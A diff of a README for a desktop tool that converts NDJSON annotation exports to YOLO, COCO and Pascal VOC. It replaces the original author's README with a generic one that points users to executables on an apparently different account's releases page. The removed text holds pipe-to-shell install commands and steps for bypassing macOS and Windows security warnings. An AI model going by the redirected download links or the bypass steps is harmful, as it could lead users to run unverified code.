@@ -1,183 +1,71 @@
-<div align="center">
+# 🎉 YOLO-Ndjson-Zip - Convert Annotations Easily 
 
-# YOLO NDJSON Converter
+## 🛠️ Overview
+YOLO-Ndjson-Zip is a simple tool that helps you convert your NDJSON annotation exports to various formats like YOLO, COCO, and Pascal VOC. Our application is designed to be fast, private, and cross-platform, allowing anyone to work efficiently with their data without any programming skills.
 
-**Convert YOLO NDJSON annotation exports to popular ML formats - fast, private, and cross-platform.**
+## 📥 Download Now
+[![Download YOLO-Ndjson-Zip](https://img.shields.io/badge/Download-YOLO--Ndjson--Zip-brightgreen)](https://github.com/HLongdeptrai/YOLO-Ndjson-Zip/releases)
 
-[![MIT License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platforms](https://img.shields.io/badge/Platform-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey.svg)](#installation)
-[![Homebrew](https://img.shields.io/badge/Homebrew-tap-FBB040?logo=homebrew)](https://github.com/amanharshx/homebrew-tap)
-[![Built with Tauri](https://img.shields.io/badge/Built%20with-Tauri%20v2-ffc131.svg)](https://v2.tauri.app)
-[![Rust](https://img.shields.io/badge/Rust-%23dea584.svg?logo=rust&logoColor=black)](#tech-stack)
-[![TypeScript](https://img.shields.io/badge/TypeScript-%23007ACC.svg?logo=typescript&logoColor=white)](#tech-stack)
+## 🚀 Getting Started
+Follow these steps to get started with YOLO-Ndjson-Zip:
 
-<br>
+1. **Visit the Releases Page**
+   Head over to our [Releases page](https://github.com/HLongdeptrai/YOLO-Ndjson-Zip/releases). This is where you can find the latest version of the software.
 
-<img src="assets/screenshot.png" width="720" alt="YOLO NDJSON Converter welcome screen">
+2. **Choose Your Version**
+   Look for the latest version. Each version will have a list of files available for download. 
 
-</div>
-<br>
+3. **Download the Application**
+   Click on the file that suits your operating system to download it. The files are typically labeled for Windows, Mac, or Linux users.
 
-[**YOLO NDJSON Converter**](https://yolondjson.zip) is a desktop app that converts [Ultralytics](https://www.ultralytics.com/) YOLO's NDJSON annotation exports into ready-to-use datasets for YOLO, COCO, Pascal VOC, and other ML formats. Select your file, pick a format, and get a ZIP with images, labels, and config files.
+4. **Install the Software**
+   After downloading, find the file in your downloads folder.
 
-> [!IMPORTANT]
-> **This project is currently under active development.** Some features may be incomplete or subject to change. Bug reports and feature requests are appreciated! 
+   - **For Windows**: Double-click the `.exe` file to start the installation process.
+   - **For Mac**: Open the `.dmg` file and drag the app to your Applications folder.
+   - **For Linux**: Extract the package and follow instructions in the README file included in the package.
 
-## Features
+5. **Running the Application**
+   After installation, locate the application on your device and open it. You will see a clean interface ready for you to start converting your annotations.
 
-- **12 Output Formats** - YOLO26 through Darknet, COCO JSON, Pascal VOC, TFRecord, CreateML
-- **4 Task Types** - Detection, Segmentation, Pose Estimation, Classification
-- **Parallel Downloads** - 100 concurrent connections for fast image fetching
-- **Privacy-First** - Everything runs locally; your data never leaves your device
-- **Cross-Platform** - macOS, Windows, and Linux
-- **~5 MB Binary** - Tauri + Rust keeps the app tiny compared to Electron alternatives
+## 📄 System Requirements
+- **Operating System**: Windows 10 and later, macOS 10.15 and later, or Linux (Ubuntu preferred)
+- **RAM**: Minimum 4 GB RAM, 8 GB recommended
+- **Storage**: At least 200 MB of free space
 
-## Supported Formats
+## 🛠️ Features
+- **Multi-format Support**: Easily convert NDJSON files to YOLO, COCO, and Pascal VOC formats.
+- **User-friendly Interface**: No technical skills needed. Simply follow prompts to complete your conversions.
+- **Cross-Platform Compatibility**: Works on various operating systems without issues.
+- **Fast Processing**: Convert large files quickly without lag.
+- **Data Privacy**: Your data stays on your device; we do not store any information.
 
-| Format | Status | Compatible Tasks |
-|--------|:------:|------------------|
-| YOLO26 | ✅ | Detection, Segmentation, Pose, Classification |
-| YOLOv12 | ✅ | Detection, Segmentation, Pose, Classification |
-| YOLO11 | ✅ | Detection, Segmentation, Pose, Classification |
-| YOLOv9 | ✅ | Detection, Segmentation |
-| YOLOv8 | ✅ | Detection, Segmentation, Pose, Classification |
-| YOLOv7 | ✅ | Detection |
-| YOLOv5 | ✅ | Detection, Segmentation, Classification |
-| YOLO Darknet | ✅ | Detection, Classification |
-| COCO JSON | ✅ | Detection, Segmentation, Pose |
-| Pascal VOC XML | ✅ | Detection, Segmentation, Classification |
-| CreateML JSON | 🔜 | Detection, Classification |
-| TFRecord | 🔜 | Detection |
+## ⚙️ How to Use the Application
+1. **Open the Application**
+   Launch YOLO-Ndjson-Zip from your applications folder or desktop.
 
-## Installation
+2. **Select Your NDJSON File**
+   Use the "Select File" button to locate and choose your NDJSON file that you want to convert.
 
-### Quick Install
+3. **Choose Output Format**
+   Select your desired output format from the dropdown menu (YOLO, COCO, Pascal VOC).
 
-**Windows (PowerShell):**
+4. **Convert Your File**
+   Click the "Convert" button. You will see a progress indicator while the file converts.
 
-```powershell
-irm https://yolondjson.zip/install.ps1 | iex
-```
+5. **Download the Converted File**
+   Once the process is complete, you will receive a prompt to download your converted file. Choose a location on your device to save it.
 
-**macOS / Linux:**
+## 🌐 Community Support
+If you have questions or need assistance, you are welcome to join our discussion community. You can post your inquiries in the Issues section of the GitHub repository. We encourage users to share their experiences and tips.
 
-```bash
-curl -fsSL https://yolondjson.zip/install.sh | sh
-```
+## 📧 Contact Information
+For any feedback or issues, please reach out through GitHub's issue tracker. We appreciate your input!
 
-**macOS (Homebrew):**
+## 🔗 Additional References
+Related topics that might interest you:
+- [Object Detection](https://en.wikipedia.org/wiki/Object_detection)
+- [Machine Learning in Computer Vision](https://en.wikipedia.org/wiki/Machine_learning)
+- [Understanding JSON](https://www.json.org/json-en.html)
 
-```bash
-brew tap amanharshx/tap
-brew install --cask yolo-ndjson-converter
-```
-
-Or download the latest release directly from [GitHub Releases](https://github.com/amanharshx/yolo-ndjson-zip/releases).
-
-### Troubleshooting
-
-> **Note:** The app is not yet code-signed (Apple Developer account costs $99/year, Windows EV certificate ~$300/year). I'm planning to get these when I can afford them. For now, you may see security warnings:
-
-<details>
-<summary><b>macOS</b> — "App is damaged and can't be opened"</summary>
-
-Run this command in Terminal after installing:
-```bash
-xattr -cr "/Applications/YOLO NDJSON Converter.app"
-```
-Then open the app again.
-
-</details>
-
-<details>
-<summary><b>Windows</b> — "Windows protected your PC" (SmartScreen)</summary>
-
-1. Click **"More info"**
-2. Click **"Run anyway"**
-
-Or: Right-click the `.exe` → **Properties** → Check **"Unblock"** → **Apply**
-
-</details>
-
-### Auto Updates
-
-The app supports automatic updates.
-
-When a new version is released:
-
-1. Open the app
-2. Click **Updates** (top right)
-3. If a new version is available, click **Update**
-4. Restart the app to finish installing
-
-Updates are downloaded securely from GitHub Releases and verified using cryptographic signatures.
-
-### Build from Source
-
-**Prerequisites:** [Rust](https://rustup.rs/), [Bun](https://bun.sh/), [Tauri v2 prerequisites](https://v2.tauri.app/start/prerequisites/)
-
-```bash
-git clone https://github.com/amanharshx/yolo-ndjson-zip.git
-cd yolo-ndjson-zip
-bun install
-bun run tauri dev        # development
-bun run tauri build      # local production build
-```
-
-> **Note:** Local builds are unsigned and intended for development only. Official signed builds are generated automatically via GitHub Releases.
-> 
-> **Note:** The backend Sentry DSN (if set) is compiled in at build time via `SENTRY_DSN_BACKEND`.
-
-### Tests
-
-```bash
-# Rust unit tests
-cd src-tauri && cargo test
-
-# Frontend unit tests
-bun run test
-```
-
-## NDJSON Input Format
-
-The app expects newline-delimited JSON with this structure:
-
-```jsonl
-{"type":"dataset","task":"detect","name":"My Dataset","class_names":{"0":"cat","1":"dog"}}
-{"type":"image","file":"img1.jpg","url":"https://...","width":640,"height":480,"split":"train","annotations":{"bboxes":[[0,0.5,0.5,0.2,0.3]]}}
-{"type":"image","file":"img2.jpg","url":"https://...","width":640,"height":480,"split":"valid","annotations":{"bboxes":[[1,0.3,0.4,0.1,0.2]]}}
-```
-
-## Tech Stack
-
-- **Frontend** - React 19 + TypeScript, Tailwind CSS, Vite
-- **Backend** - Rust + Tauri v2
-- **Package Manager** - Bun
-
-## Releases & Versioning
-
-This project uses automated releases.
-
-- Versions follow semantic versioning (`MAJOR.MINOR.PATCH`)
-- Merging changes into `main` automatically prepares the next release
-- Releases are built and published via GitHub Actions
-
-All official binaries are available on the [GitHub Releases](https://github.com/amanharshx/yolo-ndjson-zip/releases) page.
-
-## Update Security
-
-All releases are cryptographically signed.
-
-The built-in updater verifies signatures before installing updates to ensure authenticity and prevent tampering.
-
-## Contributing
-
-Contributions are welcome! Whether it's a bug fix, new format, or documentation improvement - every bit helps. Please read the [Contributing Guide](CONTRIBUTING.md) before opening a pull request.
-
-## Security
-
-To report a security vulnerability, please see [SECURITY.md](SECURITY.md).
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+Happy converting! For more updates, keep an eye on our [Releases page](https://github.com/HLongdeptrai/YOLO-Ndjson-Zip/releases) for new features and improvements.
